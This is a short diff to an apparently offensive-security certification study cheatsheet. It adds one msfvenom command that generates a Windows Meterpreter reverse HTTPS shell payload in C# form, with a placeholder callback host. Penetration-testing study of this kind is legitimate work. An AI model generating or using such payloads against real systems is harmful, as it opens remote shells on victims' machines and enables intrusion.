@@ -1,5 +1,7 @@
 # **OSEP Cheatsheet**
 
+ sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=XXX LPORT=443 EXITFUNC=thread -f csharp | tr -d '\n'
+
 <br>
 
 #### Compiled by: **purg3**
